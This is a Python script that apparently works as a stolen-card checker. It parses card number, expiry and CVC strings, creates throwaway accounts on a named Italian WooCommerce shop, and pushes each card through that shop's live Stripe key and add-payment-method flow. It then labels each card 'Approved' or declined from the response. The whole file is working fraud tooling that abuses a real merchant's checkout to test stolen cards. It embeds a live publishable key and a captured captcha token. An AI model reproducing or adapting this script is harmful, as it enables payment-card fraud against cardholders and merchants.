import requests
import re
import time
import random
import re,json
import string
import base64
from bs4 import BeautifulSoup
import user_agent
import pyfiglet
import os
import webbrowser
from colorama import Fore
from getuseragent import UserAgent
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'password': 'ASDzxc#123#',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_session_entry': 'https://purpleprofessionalitalia.it/my-account/',
	    'wc_order_attribution_session_start_time': '2024-10-17 14:07:30',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Registrati',
	}
	
	response = r.post('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'user-agent': user,
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=iegeodftomeppqjdgk%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b3cbdc8c-14a9-4fcb-8f0d-a44b74b1d2ac6fe321&muid=cde4c65d-0942-4fa0-be37-b72e8106bda6b61009&sid=e2c7e701-f794-4e8b-a262-bf996976f0afbe2fb3&payment_user_agent=stripe.js%2F7a2b7e5bb0%3B+stripe-js-v3%2F7a2b7e5bb0%3B+split-card-element&referrer=https%3A%2F%2Fpurpleprofessionalitalia.it&time_on_page=25143&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiaVpWOGprbVVvY0szMlZkbk1HZ3NNSE1TU3pLSnBDa2wrTi9lWkZHUVdCa2pvTzg1SzN6Qks5YlhYNVZMTUtlNXJjd00yS0YzL3JzNUNFWkUyLzBLdC91SUYzMjNsbXp2U3BVRmFTSU4xWlB2WUhrTVJMZEhlNjNpWGl4cWZlVlh0VHRIZzJOWVgvcGxucTYxdy82c3hjWjRwWkd5L1JGck92VDk3RHlzTnc2NE5tVy91T05NekVqaTBIU05pS3ordU1wa3VkMDQzM0lFcGJKVFB5L0JIc2NDZm9KbWVUUTl6SmgxdU5sdW80Sit1Vjc4YjRRdmpWdmdoREhDWHFzaTlGZEt0ZENoWHVQUjVHWlk1UUJ4ejhoL0tKWTVZd0M2dHJwV2NMeTJGc1JLSlVWYnR4ZlJNdDNkTFBXOGUrOEtGdUpzUGlrMWN1aDlvanZkSXJNelBPOVo4c3ZiWWNyYUhOeWhDRFF5RVdEdTJrajdLRVQ1L2VHSExiL3hkNWJWOXh2Q3VvNUMvRFdOQVZvaUhuWXk2WTkvT2lrcE5LbzlOS1VEVEhjTnE3dzhWSkFrbjV3VXN6Q252eGcwVEM4bGhQZmhicm1wSmtMakVibDVRcUMyNTlYaS9xQVRpaDdNaTlXbFJVbmxTY2pOSndSVzFzY3Bsa2EraUFaODNvSW1oZlZpZFpXM1U3VWlMUndyUVRlcGU3NFJxTHdGb0xUNy9YUlpZWmpIN0tONHFmMnRCejBZOTArNnB2Q1F6KzRrT3NkdmRNYUswRThqMkdkenZSWVdTNHFtTFhMNXpCemZEVzZaK3FqenRQTTdhRy9ZTTNJd2tqNmZNSUR6Yy96bUMxT3Jkc2tORE9yVnBnUlVXcnFwTHZlL01KVzRGcEgxS0NmWjJuc1pHVGhLam5aYy9nZVA2cGtHNHNDVGtsbUpqYlRCY1JSWkllSVBqMUN6dmo0Q1RqTmNWWkhUOHBCaWJlOWYxWmI5ZGZSVUk2cDR0QjYxWmtsSG5qMU5nUWVYU3ZsMDFyd1FBR1gwdW9ISDBieks0ZWw4WmsvTk1EcmZrR0RKcFRlaUp0R3c5c2s2STNQbGhiOWpmMUhiM2FoZ2FZOUZmRVptU2I3VlgrSEErckhsVU1rcE9ROFZiTDZ0Qms2Y1NjekdLdzduOWRQT1c4SWsxZ0FxcXdwcDQ1T3VJejVrMkJrVDBULytLcWpGeHNPSHprUUpxaktFZmJnQ2toYkhRM0EyeUFGd3d2dUtiOXZwN1o2K3dpQWU3MlhjRGRZaEY4RG9jdy9CL255elgySEVSV3ljYWdIRTI4N3puTWJGUXp6VUc2dWtrZDlNNzgyUHZrSTRVaUhpMFVYYjMrNjFZc1h3MFJOUzNwZ3h6QUV4ODJoWkk5T0RubjltYU9jTVZ3UCtLN1Fxd1pCN2dabjBuZGFCYlpCZ3NuLzVWNDdBN3Q2WkRmUVZUbUdZVGc5Ymg0VzRmTmRacUVqUEgwZHhiNEV4QTJOSnFEZ2lKOHpRYmRpbmRBSVRzTnFRMExWZXY5bGRIWjBDY0VOTmg5VnFTbkF1cVp5VWtwN1pNbHg3bEZNQXd2T3dZRUxGbWU0R0pmdk5RZStRN0x3ZlhqN21QVHBKSEQwNnBTYmFnT0N4Z1FCRDVhYml5NWpzcEFOdEwzSWZoZG5EYnBxbnp2UUE5RDZlZ1VxQmJIZmlUUEFpU1MzVmdNTFhjUU03aVlic1E5U1pnbXJyWEFoSWRwa0hCbHhVVU9WSkVQRTVhSzM1dHJyYk1QQWFYVlRpMXZDbVRxbGI2N1NSSTQ0cGgzeUxNTkhMSkZxb1o1bUNmSWtRM09tRit4ZE5zOE1oa1RuekU3QlU4dG9YN1VxU1R4YkpFcTh5TlRWV1NJWENWcW5NR1VhUUczNjBNaXU5bHRwWktiZ3pSdmx0dDFwRFJKN1NWak5sMmM3enRFc05QNnZJM3NMRWJSVm9sMjlhbW9Xd2M1OFJtNGZmcmVwdEZrbVdEdDhUTFp4ZWltK1FjZGp3dE1pNnlLbmJMT0FHMm5uY1VpeEs3VWY3SkMwSExPQXNYVXQyMHpDbDM0SW41N2FmbUVsbjRxL2pEUllHdjg5VFRoUUtKY2RkOE5HQWlySnZYZ0kveVgxWHdtZWxBbzVlblJoalFZVFh2WG5ocnF0NlBtL3NmNnJwZ3dFVFBVZHNzQzkxRkNjNlU5R0lNMFpJdTdyL2lUL0hMbmp4bkV5dExHUm1VandrR0QrOHgycytNbSszYkxTQ3VybkpwT0tSMXorTUFDOTdkcFdvMDZxeDVMWk12Mm84RVRDMDZGR091djNFSGhqSkp4YXBrSnJMeExYdkJ0STJsdkJ6cmdkNmlIRXZmSExrN3p4aDBRNmx0NkY3cFZlT2NPb0Z3WkZhVTcxci9nY1ZvZ0JaVzR4VFEvUlBQMTM5OXBjRkdoUlNwbXp3cmZQeWNVdmNHbVY4bTJWUHpja0t5T2plZC9MemFLZit2c3Zma3I0ZXhTVTE1OE0zNUM4RytRWjdTT20wWFlrV0lZM1NmeHQ0bjVZTjNxNk56Vmc3WnB3TStrSEFzY3cxU21xRkQ3U2JveXRzWHg0SUlmNmpReHBQUW44QnI3VE5XUUVpcDl4eXhCclpwRDZpNzhKS2R1WjhFeFhaOHp6MWxxa01ocGZ3R0ZGSDM0Tml0R3hkdm90aGZyQ1R4cU1TRDBMYU5OdGp2Zmp2U1BjODNMSTdJTXpEZnlvQVA1eVIxYy9EYzQrOVNtZ2ZxcHVzT2FHUWNkbmxHblVPbGg2SHY2eDB0VXJtYzZFY3JRRDFNMTVFbHVzMFRUTElYYjhVTmRBNUpwclhvcGJPL05wbk90TmhpaVF6ck5yVUcxcDJaem00V1RyZC9Jc1V5SFZlMWl1NUFMbDBTcG9sQVVQMHpSOD0iLCJleHAiOjE3MjkxNzQ2MjAsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiMmIzYzFkOSIsInBkIjowLCJjZGF0YSI6InhmUDh6L0VDRWNFeXY4L1o0RGxpZE5yVWQrODRyMkVrd2IzT2hYSFRkZHNVOVIrcDBMd2RQNWp0bUE4NVFhSEhucnVrVy9taUVBcm94MXNZSWFXbmJBUTl5QXEydDExUjRqSVFEVXdrVExSNVJUQUVicE9NUXl6aDVrd1hMK1NtaVFQNHYwMVVRTWxhUm1MVXhTK0JTYlB1YkFNWW5WR1g0K1Z0bmY0dU1qL29xNU9TTWxsRFkrcG9na0xWNHFuU05vOVdIaGJKUFpUOVB1MWMifQ.k1SAwQenMZpX9vLknwYM7BelxRSuhnhV0G1cp816Ijc'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']
	
	headers = {
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = r.post('https://purpleprofessionalitalia.it/', params=params, cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'success' in text:
			result = "success"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "declined"
	if 'avs' in result or 'success' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def sq(card):
	return 'ابقي غطيها كويس لما تيجي تنام'